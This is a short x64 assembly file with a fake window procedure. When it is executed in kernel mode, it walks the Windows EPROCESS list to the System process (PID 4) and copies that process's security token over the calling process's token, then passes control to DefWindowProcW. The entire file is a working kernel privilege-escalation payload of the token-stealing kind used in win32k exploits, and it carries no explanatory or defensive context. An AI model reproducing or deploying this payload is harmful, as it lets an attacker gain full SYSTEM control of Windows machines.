public WndProc_fake
extern DefWindowProcW:proc 
.code


WndProc_fake proc hwnd:dword, msg:dword, wParam:dword, lParam:dword
    mov ax,cs
    cmp ax,10h
    jnz return
    pushfq
	push rax
	push rdx
	push rbx
	mov rax, gs:[188h]    ;CurrentThread
	mov rax, [rax + 210h] ;Process  
	lea rdx, [rax + 208h] ;MyProcess.Token
noFind :
	mov rax, [rax + 188h] ;Eprocess.ActiveProcessLinks
	sub rax, 188h         ;next Eprocess struct
	mov rbx, [rax + 180h] ;PID
	cmp rbx, 4
	jnz noFind
	mov rax, [rax + 208h] ;System.Token
	mov [rdx], rax
	pop rbx
	pop rdx
	pop rax
	popfq
return:
    mov ecx,hwnd
    mov edx,msg
    mov r8d,wParam
    mov r9d,lParam
    sub rsp,20h
    call DefWindowProcW
    add rsp,20h
    ret

WndProc_fake endp


end